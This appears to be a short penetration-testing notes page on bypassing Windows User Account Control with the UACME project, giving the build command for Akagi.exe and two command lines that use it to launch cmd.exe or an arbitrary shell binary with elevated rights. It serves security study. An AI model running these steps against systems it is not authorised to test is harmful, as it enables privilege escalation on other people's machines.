# UAC Bypass

{% hint style="danger" %}
To bypass the UAC, we need to be at least an administrator.
{% endhint %}

One of the most common methods is to use the [UACME](https://github.com/hfiref0x/UACME) project.

### Compilation

{% tabs %}
{% tab title="Visual Studio (Command Line)" %}
```
msbuild .\uacme.sln
```
{% endtab %}

{% tab title="Visual Studio (GUI)" %}
To compile it in Visual Studio, we need the `uacme.sln` file, which is in the **Source** folder.
{% endtab %}
{% endtabs %}

### Practice

We transfer the Akagi.exe binary, and then we can bypass the UAC in different ways. Read documentation.

{% hint style="info" %}
Path: UACME\Source\Akagi\output\x64\Debug\Akagi.exe
{% endhint %}

```shell
.\Akagi.exe <KEY> # cmd.exe by default
.\Akagi.exe <KEY> <PATH>\shell.exe # Execute binary
```
